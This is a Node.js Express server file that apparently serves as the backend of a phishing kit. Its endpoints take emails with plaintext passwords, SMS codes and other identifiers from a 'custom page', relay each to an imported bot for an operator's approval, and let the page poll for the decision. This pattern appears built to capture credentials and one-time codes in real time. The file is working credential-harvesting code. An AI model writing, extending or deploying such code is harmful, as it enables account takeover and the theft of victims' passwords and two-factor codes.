console.log("📦 Starting combined server.js...");

const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const fetch = require("node-fetch");
const { sendApprovalRequest, sendApprovalRequestGeneric, sendApprovalRequestSMS } = require("./bot");

const app = express();
const PORT = process.env.PORT || 3000;

// -----------------
// Store pending approvals
// -----------------
let pendingUsers = {}; // email/password login
let pendingCodes = {}; // SMS codes
let pendingGeneric = {}; // generic codes

app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));

// -----------------
// Health check
// -----------------
app.get("/", (req, res) => {
  res.send("✅ Combined Server is running.");
});

// -----------------
// Backend for your custom page
// -----------------
app.post("/page-login", (req, res) => {
  const email = (req.body.email || "").trim().toLowerCase();
  const password = req.body.password;

  if (!email || !password) return res.status(400).json({ success: false, message: "Email and password required" });

  // Add to pending users
  pendingUsers[email] = { password, status: "pending" };
  console.log(`📥 Page Login Received: ${email}`);

  // Send to bot for approval
  sendApprovalRequest(email, password);

  res.json({ success: true });
});

// -----------------
// Email/Password Login
// -----------------
app.post("/login", (req, res) => {
  const email = (req.body.email || "").trim().toLowerCase();
  const password = req.body.password;

  if (!email || !password) return res.status(400).json({ success: false, message: "Email and password required" });

  pendingUsers[email] = { password, status: "pending" };
  console.log(`📥 Login Received: ${email}`);

  sendApprovalRequest(email, password);
  res.json({ success: true });
});

// -----------------
// Generic code submission
// -----------------
app.post("/generic-login", (req, res) => {
  const identifier = (req.body.identifier || "").trim();
  if (!identifier) return res.status(400).json({ success: false, message: "Identifier required" });

  pendingGeneric[identifier] = { status: "pending" };
  console.log(`📥 Generic Identifier Received: ${identifier}`);

  sendApprovalRequestGeneric(identifier);
  res.json({ success: true });
});

// -----------------
// SMS Login
// -----------------
app.post("/sms-login", (req, res) => {
  const code = (req.body.code || "").trim();
  if (!code) return res.status(400).json({ success: false, message: "Code required" });

  pendingCodes[code] = { status: "pending" };
  console.log(`📥 SMS Code Received: ${code}`);

  sendApprovalRequestSMS(code);
  res.json({ success: true });
});

// -----------------
// Check status
// -----------------
app.get("/check-status", (req, res) => {
  const identifier = (req.query.identifier || "").trim();
  if (pendingUsers[identifier]) return res.json({ status: pendingUsers[identifier].status });
  if (pendingCodes[identifier]) return res.json({ status: pendingCodes[identifier].status });
  if (pendingGeneric[identifier]) return res.json({ status: pendingGeneric[identifier].status });
  res.json({ status: "unknown" });
});

// -----------------
// Update approval status (called by bot)
// -----------------
app.post("/update-status", (req, res) => {
  const identifier = (req.body.identifier || "").trim();
  const status = req.body.status;

  console.log(`📬 Update Status Received: ${identifier}, ${status}`);

  if (pendingUsers[identifier]) {
    pendingUsers[identifier].status = status;
  } else if (pendingCodes[identifier]) {
    pendingCodes[identifier].status = status;
  } else if (pendingGeneric[identifier]) {
    pendingGeneric[identifier].status = status;
  } else {
    return res.json({ ok: false, message: "Identifier not found" });
  }

  console.log(`✅ Status updated for: ${identifier}`);
  res.json({ ok: true });
});

// -----------------
// Self-ping to stay awake
// -----------------
setInterval(() => {
  const url = process.env.APP_URL;
  if (url) {
    fetch(url).then(() => console.log("🔁 Pinged self")).catch(err => console.error("⚠️ Ping failed:", err));
  }
}, 30 * 1000);

// -----------------
// Start server
// -----------------
app.listen(PORT, () => {
  console.log(`✅ Combined server running at port ${PORT}`);
});
